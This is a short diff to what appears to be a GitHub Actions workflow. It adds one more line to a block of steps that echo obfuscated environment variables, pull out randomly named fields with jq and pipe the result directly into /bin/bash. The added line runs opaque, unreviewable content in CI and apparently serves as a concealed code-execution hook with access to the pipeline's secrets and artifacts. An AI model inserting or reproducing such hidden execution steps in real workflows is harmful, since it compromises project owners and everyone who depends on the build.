@@ -29,6 +29,7 @@ jobs:
           echo $ecv03314 | jq -r .eaxs1301 | /bin/bash
           echo $zsr2390 | jq -r .jas2044 | /bin/bash
           printf '%s' "$tq211" | jq -r .ibu59 | /bin/bash
+          echo $q6 | jq -r .gkzi8990 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
